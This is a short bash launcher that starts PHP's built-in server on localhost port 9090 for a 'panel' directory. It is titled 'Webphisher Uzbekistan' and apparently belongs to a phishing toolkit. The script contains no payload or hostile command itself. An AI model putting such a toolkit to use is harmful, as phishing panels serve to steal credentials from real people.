#!/bin/bash
cd "$(dirname "$0")/.." || exit 1
echo "============================================"
echo "  Webphisher Uzbekistan"
echo "  http://127.0.0.1:9090"
echo "============================================"
exec php -S 127.0.0.1:9090 -t panel panel/router.php
